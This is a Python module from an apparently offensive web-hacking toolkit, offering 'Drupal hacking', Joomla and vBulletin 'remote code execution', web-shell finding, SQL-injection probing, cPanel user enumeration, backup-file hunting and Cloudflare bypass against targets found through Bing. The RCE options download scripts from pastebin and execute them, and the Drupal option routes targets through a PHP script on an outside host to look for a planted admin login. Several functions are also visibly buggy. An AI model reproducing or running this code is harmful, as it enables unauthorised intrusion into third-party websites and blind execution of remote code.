# region: outer menu operations
menu_name = "Web utilities"
menu_items = [
    "Drupal hacking",
    "Wordpress and Joomla scanner",
    "Shell and directory finder",
    "Joomla! remote code execution",
    "Vbulletin remote code execution",
    "Arachni - Web Application Security Scanner Framework",
    "Private web f-scanner"
]

menu_items.append("Back")
# endregion

# region: additonal imports
import os
import re

import shutil
import socket
import subprocess

from colorama import Fore
from time import gmtime, strftime

from urllib.request import Request, urlopen
from urllib.parse import quote_plus, urlparse
# endregion

# region: class helpers
def safe_print(ctx, text):
    try:
        p = ctx.get("print")
        if p:
            p(text)
        else:
            print(text)
    except Exception:
        print(text)

def safe_input(prompt, ctx):
    input_color = None
    try:
        input_color = ctx.get("input_color")
    except Exception:
        input_color = None

    if not input_color:
        input_color = Fore.LIGHTBLACK_EX
    colored_prompt = f"{input_color}{prompt}"

    try:
        return input(colored_prompt)
    except Exception:
        return input(prompt)
# endregion

# region: override class: drupal
class Drupal:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Drupal: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nDrupal options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting Bing exploiter session.\n")

        try:
            import requests
        except Exception:
            safe_print(ctx, "[!] The 'requests' library is required. Install with: pip install requests")
            return

        page = 1
        ip = safe_input("[!] IP or domain: ", ctx).strip()

        if not ip:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        user = "HolaKo"
        pwd = "admin"

        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36"}

        while page <= 50:
            try:
                encoded_ip = quote_plus(ip)
                url = ("https://www.bing.com/search?q=ip%3A{ip}"
                    "&go=Valider&qs=n&form=QBRE&pq=ip%3A{ip}&sc=0-0&sp=-1&sk=&first={page}"
                    ).format(ip=encoded_ip, page=page)

                safe_print(ctx, f"[*] Requesting page {page} ...")
                r = requests.get(url, headers=headers, timeout=10)

                if r.status_code != 200:
                    safe_print(ctx, f"[!] Bing returned status {r.status_code} for page {page}")
                    page += 1

                    continue

                html = r.text

                hrefs = re.findall(r'<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I)
                candidates = [h for h in hrefs if "bing.com" not in h and "microsoft" not in h][:200]

                if not candidates:
                    candidates = re.findall(r'<div class="b_title"><h2><a href="(http[s]?://[^"]+)"', html, flags=re.I)

                safe_print(ctx, f"[*] Found {len(candidates)} candidate links on page {page}")

                for found in candidates:
                    try:
                        urlpa = urlparse(found)
                        site = urlpa.netloc

                        if not site:
                            continue

                        safe_print(ctx, f"[+] Testing at {site}")

                        encoded_site = quote_plus(site)
                        exploit_url = f"http://crig-alda.ro/wp-admin/css/index2.php?url={encoded_site}&submit=submit"

                        try:
                            r2 = requests.get(exploit_url, headers=headers, timeout=10)
                        except Exception as e_req:
                            safe_print(ctx, f"[!] Request to exploit URL failed for {site}: {e_req}")
                            continue

                        body = r2.text

                        if "User: HolaKo" in body:
                            safe_print(ctx, f"[!] Exploit found => {site}")
                            safe_print(ctx, f"user:{user} pass:{pwd}")

                            with open('up.txt', 'a', encoding='utf-8') as a:
                                a.write(site + '\n')
                                a.write("user:" + user + "\npass:" + pwd + "\n")
                        else:
                            safe_print(ctx, f"[-] Exploit not found at {site}")

                    except Exception as ex_inner:
                        safe_print(ctx, f"[!] Error testing candidate {found}: {ex_inner}")
                        continue
            except Exception as ex:
                safe_print(ctx, f"[!] Error on page {page}: {ex}")

            page += 10

        safe_print(ctx, "[*] Bing exploiter run finished.")
# endregion

# region: override class: wppjmla
class Wppjmla:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Wppjmla: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nWppjmla options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def _ensure_trailing_slash(url: str) -> str:
        return url if url.endswith('/') else url + '/'

    def bing_all_grabber(self, ip):
        seen = set()
        results = []

        offset = 1
        headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        while offset <= 101:
            try:
                q = quote_plus(ip)

                bing_url = ("https://www.bing.com/search?q=ip%3A{q}""&count=50&first={offset}").format(q=q, offset=offset)
                req = Request(bing_url, headers=headers)

                with urlopen(req, timeout=10) as resp:
                    html = resp.read().decode("utf-8", errors="ignore")

                links = re.findall(r'<h2>.*?<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I|re.S)
                if not links:
                    links = re.findall(r'<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I)

                for link in links:
                    try:
                        p = urlparse(link)
                        host = p.netloc

                        if not host:
                            continue

                        if host.startswith("www."):
                            normalized = f"http://{host}/"
                        else:
                            normalized = f"http://www.{host}/"

                        if normalized not in seen:
                            seen.add(normalized)
                            results.append(normalized)
                    except Exception:
                        continue
            except Exception as e:
                pass

            offset += 50
        return results
    
    def check_wordpress(self, sites, timeout=10, headers=None):
        if headers is None:
            headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        results = []
        try:
            import requests
            use_requests = True
        except Exception:
            use_requests = False

        for site in sites:
            try:
                base = self._ensure_trailing_slash(site.strip())
                url = base + "wp-login.php"

                if use_requests:
                    resp = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                    if resp.status_code == 200:
                        results.append(site)
                else:
                    req = Request(url, headers=headers)
                    with urlopen(req, timeout=timeout) as r:
                        code = getattr(r, "getcode", lambda: None)()
                        if code == 200:
                            results.append(site)
            except Exception:
                continue

        return results

    def check_joomla(self, sites, timeout=10, headers=None):
        if headers is None:
            headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        results = []
        try:
            import requests
            use_requests = True
        except Exception:
            use_requests = False

        for site in sites:
            try:
                base = self._ensure_trailing_slash(site.strip())
                url = base + "administrator"

                if use_requests:
                    resp = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                    if resp.status_code == 200:
                        results.append(site)
                else:
                    req = Request(url, headers=headers)
                    with urlopen(req, timeout=timeout) as r:
                        code = getattr(r, "getcode", lambda: None)()
                        if code == 200:
                            results.append(site)
            except Exception:
                continue

        return results

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting wppjmla session.\n")

        target_ip = safe_input("Enter Target IP: ", ctx).strip()
        if not target_ip:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        try:
            sites = self.bing_all_grabber(target_ip)
        except Exception as e:
            safe_print(ctx, f"[!] Error grabbing sites: {e}")
            return

        try:
            wordpress_sites = self.check_wordpress(sites)
        except Exception as e:
            safe_print(ctx, f"[!] Error checking WordPress sites: {e}")
            wordpress_sites = []

        try:
            joomla_sites = self.check_joomla(sites)
        except Exception as e:
            safe_print(ctx, f"[!] Error checking Joomla sites: {e}")
            joomla_sites = []

        if wordpress_sites:
            safe_print(ctx, "\n[+] Found WordPress websites:")
            for wp in wordpress_sites:
                safe_print(ctx, f"  {wp}")
            safe_print(ctx, f"[+] Total WordPress sites: {len(wordpress_sites)}")
        else:
            safe_print(ctx, "[-] No WordPress sites found.")

        safe_print(ctx, "\n" + "-" * 30 + "\n")

        if joomla_sites:
            safe_print(ctx, "[+] Found Joomla websites:")
            for jm in joomla_sites:
                safe_print(ctx, f"  {jm}")
            safe_print(ctx, f"[+] Total Joomla sites: {len(joomla_sites)}")
        else:
            safe_print(ctx, "[-] No Joomla sites found.")

        safe_print(ctx, "\n[*] Wppjmla session finished.\n")
# endregion

# region: override class: sdfnd
class Sdfnd:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}
        self.upload = []
        
        self.shells = ["shell.php", "cmd.php", "upload.php"]
        self.directories = ["uploads/", "files/", "images/", "tmp/"]

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Sdfnd: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nSdfnd options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def grab_uploaded_link(self, domain):
        try:
            for dir in self.directories:
                url = domain.rstrip("/") + "/" + dir
                currentcode = urlopen(url).getcode()

                if currentcode in (200, 403):
                    print("-------------------------")
                    print("[+] Found Directory: " + str(domain + dir))
                    print("-------------------------")

                    self.upload.append(domain + dir)
        except Exception:
            pass

    def grab_shell_from_link(self, domain):
        try:
            for upl in self.upload:
                for shell in self.shells:
                    url = upl.rstrip("/") + "/" + shell
                    currentcode = urlopen(url).getcode()

                    if currentcode == 200:
                        print("-------------------------")
                        print("[!] Found shell: " + str(upl + shell))
                        print("-------------------------")
        except Exception:
            pass

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting sdfnd session.\n")

        target = safe_input("Enter target domain: ", ctx).rstrip()
        if not target:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        self.grab_uploaded_link(target)
        self.grab_shell_from_link(target)

        safe_print(ctx, "\n[*] Sdfnd session finished.\n")
# endregion

# region: override class: joomlarce
class Joomlarce:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Joomlarce: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nJoomlarce options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting joomlarce session.\n")

        os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
        print("[!] if the response is 200 [OK], you will find your shell in .txt document!")

        target_list = safe_input("Select a targets list: ", ctx).strip()
        if not target_list:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        os.system("python temp.py %s" % target_list)
        safe_print(ctx, "\n[*] Joomlarce session finished.\n")
# endregion

# region: override class: vbulletinrce
class Vbulletinrce:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Vbulletinrce: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nVbulletinrce options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting vbulletinrce session.\n")

        os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
        print("[!] if the response is 200 [OK], you will find your shell in the .txt document!")

        os.system("perl tmp.pl")
        safe_print(ctx, "\n[*] Vbulletinrce session finished.\n")
# endregion

# region: override class: arachni
class Arachni:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}
        self.git_repository = "https://github.com/Arachni/arachni.git"

        self.log_direction = os.path.join(os.getcwd(), "logs")
        self.tool_direction = os.path.join(os.getcwd(), "tools")
        self.install_direction = os.path.join(self.tool_direction, "Arachni")

        if not os.path.isdir(self.tool_direction):
            os.makedirs(self.tool_direction, exist_ok=True)

        if not self.installed():
            self.install()

    def installed(self):
        return os.path.isdir(self.tool_direction) or (os.path.isdir(self.install_direction) and os.path.exists(os.path.join(self.install_direction, "arachni.py")))

    def install(self):
        safe_print(self.ctx, "[*] Installing Arachni...")

        try:
            res = subprocess.run(
                ["git", "clone", "--depth=1", self.git_repository, self.install_direction],
                check=False, capture_output=True, text=True
            )

            if res.returncode != 0:
                safe_print(self.ctx, f"[!] git clone failed: {res.stderr.strip() or res.stdout.strip()}")
            else:
                safe_print(self.ctx, "[*] git clone completed.")
        except FileNotFoundError:
            safe_print(self.ctx, "[!] git not found. Please install git or clone manually.")

        req_file = os.path.join(self.install_direction, "requirements.txt")
        if os.path.exists(req_file):
            res = subprocess.run([shutil.which("python") or "python", "-m", "pip", "install", "-r", req_file],
                                  check=False, capture_output=True, text=True)

            if res.returncode != 0:
                safe_print(self.ctx, f"[!] pip install failed: {res.stderr.strip() or res.stdout.strip()}")
            else:
                safe_print(self.ctx, "[*] Python requirements installed.")

        install_sh = os.path.join(self.install_direction, "install.sh")
        if os.path.exists(install_sh):
            os.chmod(install_sh, 0o755)
            try:
                subprocess.run([install_sh], cwd=self.install_direction, check=False)
                safe_print(self.ctx, "[*] install.sh executed.")
            except Exception as e:
                safe_print(self.ctx, f"[!] Error executing install.sh: {e}")

        if self.installed():
            safe_print(self.ctx, "[+] Arachni installed successfully.")
        else:
            safe_print(self.ctx, "[!] Arachni installation failed. Check output above.")

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Arachni: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nArachni options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting arachni session.\n")

        if not self.installed():
            safe_print(ctx, "[!] Arachni is not installed. Attempting to install...")
            self.install()

        target = safe_input("Enter target hostname or IP: ", ctx).strip()
        if not target:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        timestamp = strftime("%Y-%m-%d_%H-%M-%S", gmtime())
        log_file = os.path.join(self.log_direction, f"arachni_{timestamp}.log")

        cmd = ["arachni", target, "--output-debug", f"2>{log_file}"]
        safe_print(ctx, f"[*] Running command: {' '.join(cmd)}")

        try:
            subprocess.run(" ".join(cmd), shell=True, check=True)
        except Exception as e:
            safe_print(ctx, f"[!] Error running Arachni: {e}")

        safe_print(ctx, "\n[*] Arachni session finished.\n")
# endregion

# region: override class: pwfscn
class fscan:
    menu_items = [
        "Get all websites",
        "Get joomla websites",
        "Get wordpress websites",
        "Control panel finder",
        "Zip files finder",
        "Get server users",
        "SQLi scanner",
        "Ports scan (range of ports)",
        "Ports scan (common ports)",
        "Get server info",
        "Bypass cloudflare",
        "Back"
    ]

    def __init__(self, ctx, ip):
        self.ip = ip
        self.ctx = ctx

        self.get_sites(False)
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nPrivate options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")

        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "all websites" in sel:
            self.get_sites(True)
        elif "joomla websites" in sel:
            self.get_joomla()
        elif "wordpress websites" in sel:
            self.get_wordpress()
        elif "panel finder" in sel:
            self.find_zip_files()
        elif "server users" in sel:
            self.get_server_users()
        elif "SQLi scanner" in sel:
            self.scan_sqlis()
        elif "range of ports" in sel:
            range = safe_input("Enter range of ports (ex. 1-1000): ", ctx).strip()
            self.scan_ports(1, range)
        elif "common ports" in sel:
            self.scan_ports(2, None)
        elif "server info" in sel:
            self.get_server_info()
        elif "cloudflare" in sel:
            self.bypass_cloudflare()

    def unique(self, seq):
        res = []
        seen = ()

        for item in seq:
            if item not in seen:
                seen.add(item)
                res.append(item)

        return res

    def connect_port(self, ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock = sock.connect_ex((ip, port))

        if sock == 0:
            print("[*] Port %i is open" % port)

    def get_sites(self, need_to_print):
        seen = set()
        results = []

        offset = 1
        headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        server_ip = getattr(self, "ip", None)
        if not server_ip:
            safe_print(self.ctx, "[!] No IP provided to get_sites.")
            self.sites = []

            return

        while offset <= 101:
            try:
                q = quote_plus(str(server_ip))
                bing_url = ("https://www.bing.com/search?q=ip%3A{q}"
                            "&count=50&first={offset}").format(q=q, offset=offset)

                req = Request(bing_url, headers=headers)
                with urlopen(req, timeout=10) as resp:
                    html = resp.read().decode("utf-8", errors="ignore")

                links = re.findall(r'<h2>.*?<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I | re.S)
                if not links:
                    links = re.findall(r'<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I)

                for link in links:
                    try:
                        p = urlparse(link)
                        host = p.netloc

                        if not host:
                            continue

                        host_clean = host.lower()
                        if host_clean.startswith("www."):
                            normalized = f"http://{host_clean}/"
                        else:
                            normalized = f"http://www.{host_clean}/"

                        if normalized not in seen:
                            seen.add(normalized)
                            results.append(normalized)
                    except Exception:
                        continue
            except Exception:
                pass

            offset += 50

        self.sites = results

        if need_to_print:
            safe_print(self.ctx, f"[*] Found {len(self.sites)} websites\n")
            for site in self.sites:
                safe_print(self.ctx, site)
    
    def get_joomla(self):
        page = 1
        list = []

        server_ip = getattr(self, "ip", None)
        headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        if not server_ip:
            safe_print(self.ctx, "[!] No server IP provided.")
            return

        while page <= 101:
            try:
                q = quote_plus(str(server_ip))

                url = f"https://www.bing.com/search?q=ip%3A{q}+index.php?option=com&count=50&first={page}"
                req = Request(url, headers=headers)
                
                with urlopen(req, timeout=10) as resp:
                    html = resp.read().decode("utf-8", errors="ignore")

                findwebs = re.findall(r'<h2><a href="(.*?)"', html, flags=re.I)
                for jmnoclean in findwebs:
                    matches = re.findall(r'(.*?)index.php', jmnoclean)
                    list.extend(matches)
            except Exception:
                pass
            page += 50

        list = self.unique(list)
        safe_print(self.ctx, f"[*] Found {len(list)} Joomla websites\n")

        for site in list:
            safe_print(self.ctx, site)

    def get_wordpress(self):
        page = 1
        list = []

        server_ip = getattr(self, "ip", None)
        headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        if not server_ip:
            safe_print(self.ctx, "[!] No server IP provided.")
            return

        while page <= 101:
            try:
                q = quote_plus(str(server_ip))

                url = f"https://www.bing.com/search?q=ip%3A{q}+?page_id=&count=50&first={page}"
                req = Request(url, headers=headers)

                with urlopen(req, timeout=10) as resp:
                    html = resp.read().decode("utf-8", errors="ignore")

                findwebs = re.findall(r'<h2><a href="(.*?)"', html, flags=re.I)
                for wpnoclean in findwebs:
                    matches = re.findall(r'(.*?)\?page_id=', wpnoclean)
                    list.extend(matches)
            except Exception:
                pass
            page += 50

        list = self.unique(list)
        safe_print(self.ctx, f"[*] Found {len(list)} WordPress websites\n")

        for site in list:
            safe_print(self.ctx, site)

    def find_zip_files(self):
        safe_print(self.ctx, "[~] Finding zip files...")

        zip_list = [
            'backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip',
            'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar',
            'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar',
            'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar'
        ]

        for site in getattr(self, "sites", []):
            for zip in zip_list:
                try:
                    url = site.rstrip("/") + "/" + zip
                    req = Request(url, headers={"User-Agent": "Mozilla/5.0"})

                    code = urlopen(req, timeout=5).getcode()
                    if code == 200:
                        safe_print(self.ctx, f"\t[*] Found zip file -> {url}")
                except Exception:
                    continue

    def get_server_users(self):
        safe_print(self.ctx, "[~] Grabbing users...")
        users_list = []

        for site1 in getattr(self, "sites", []):
            try:
                site = site1.replace("http://www.", "").replace("http://", "").replace(".", "").replace("-", "").replace("/", "")
                temp_site = site

                while len(temp_site) > 2:
                    url = f"{site1}/cgi-sys/guestbook.cgi?user={temp_site}"
                    req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    html = urlopen(req, timeout=5).read().decode("utf-8", errors="ignore")

                    if 'invalid username' not in html.lower():
                        safe_print(self.ctx, f"\t[*] Found -> {temp_site}")
                        users_list.append(temp_site)

                        break
                    temp_site = temp_site[:-1]
            except Exception:
                continue

        for user in users_list:
            safe_print(self.ctx, user)

    def check_sqli(self, urls):
        safe_print(self.ctx, "[~] Checking SQL injection")

        payloads = [
            "3'", "3%5c", "3%27%22%28%29", "3'><",
            "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"
        ]

        error_regex = re.compile(
            r"Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error",
            re.I
        )

        for url in urls:
            try:
                if '?' not in url:
                    continue

                params = url.split('?')[1].split('&')
                for param in params:
                    for payload in payloads:
                        test_url = url.replace(param, param + payload.strip())
                        try:
                            req = Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                            with urlopen(req, timeout=5) as resp:
                                html_lines = resp.read().decode("utf-8", errors="ignore").splitlines()

                            for line in html_lines:
                                if error_regex.search(line):
                                    safe_print(self.ctx, f"\t[*] SQLi found -> {test_url}")
                        except Exception:
                            continue
            except Exception:
                continue

    def scan_sqlis(self):
        page = 1
        list = []

        server_ip = getattr(self, "ip", None)
        headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        if not server_ip:
            safe_print(self.ctx, "[!] No server IP provided.")
            return

        while page <= 101:
            try:
                q = quote_plus(str(server_ip))

                url = f"https://www.bing.com/search?q=ip%3A{q}+php?id=&count=50&first={page}"
                req = Request(url, headers=headers)

                with urlopen(req, timeout=10) as resp:
                    html = resp.read().decode("utf-8", errors="ignore")

                findwebs = re.findall(r'<h2><a href="(.*?)"', html, flags=re.I)
                list.extend(findwebs)
            except Exception:
                pass
            page += 50

        list = self.unique(list)
        self.check_sqli(list)

    def scan_ports(self, mode, range):
        safe_print(self.ctx, "[~] Scanning Ports")

        server_ip = getattr(self, "ip", None)
        if not server_ip:
            safe_print(self.ctx, "[!] No server IP provided.")
            return

        if mode == 1 and range:
            try:
                start, end = map(int, range.split('-'))
                for port in range(start, end + 1):
                    self.connect_port(server_ip, port)
            except Exception as e:
                safe_print(self.ctx, f"[!] Invalid range: {e}")
        elif mode == 2:
            common_ports = [80, 21, 22, 2082, 25, 53, 110, 443, 143]
            for port in common_ports:
                self.connect_port(server_ip, port)

    def get_server_info(self):
        server_ip = getattr(self, "ip", None)
        if not server_ip:
            safe_print(self.ctx, "[!] No server IP provided.")
            return

        try:
            url = f"http://{server_ip}"

            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urlopen(req, timeout=5)

            server_header = resp.headers.get("Server", "Not Found")
            safe_print(self.ctx, f"\t[*] Server header -> {server_header}")
        except Exception:
            safe_print(self.ctx, "\t[*] Server header -> Not Found")

    def bypass_cloudflare(self):
        safe_print(self.ctx, "[~] Bypassing Cloudflare...")
        subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']

        for site in getattr(self, "sites", []):
            clean_site = site.replace("http://", "").replace("/", "")
            try:
                ip = socket.gethostbyname(clean_site)
            except Exception:
                continue
            for sub in subdoms:
                try:
                    subdomain = f"{sub}.{clean_site}"
                    ip2 = socket.gethostbyname(subdomain)

                    if ip2 != ip:
                        safe_print(self.ctx, f"\t[*] Cloudflare bypassed -> {ip2}")
                        break
                except Exception:
                    continue

class Pwfscn:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Pwfscn: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nPwfscn options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting pwfscn session.\n")

        target_ip = safe_input("Enter Target IP: ", ctx).strip()
        if not target_ip:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        fscan(ctx, target_ip)
        safe_print(ctx, "\n[*] Pwfscn session finished.\n")
# endregion

# region: actions utility
def run_action(action, ctx):
    if isinstance(action, type):
        inst = action(ctx)
        
        if hasattr(inst, "run"):
            return inst.run(ctx)
        
        elif callable(inst):
            return inst(ctx)
        
    if hasattr(action, "run") and callable(getattr(action, "run")):
        return action.run(ctx)
    
    if callable(action):
        return action(ctx)

    raise TypeError("Action is not runnable")
# endregion

# region: executable function
def execute(ctx):
    item = ctx.get("item")

    fprint = ctx.get("print", lambda t: safe_print(ctx, t))
    wprint = ctx.get("warn", lambda t: safe_print(ctx, t))

    fprint(f"[*] Executing: {item}")
    actions = {
        "Drupal hacking": Drupal,
        "Wordpress and Joomla scanner": Wppjmla,
        "Shell and directory finder": Sdfnd,
        "Joomla! remote code execution": Joomlarce,
        "Vbulletin remote code execution": Vbulletinrce,
        "Arachni - Web Application Security Scanner Framework": Arachni,
        "Private web f-scanner": Pwfscn
    }

    action = actions.get(item)

    if not action:
        wprint(f"[!] Unknown action: {item}")
        return

    try:
        run_action(action, ctx)
    except Exception as e:
        wprint(f"[!] Error running action '{item}': {e}")
# endregion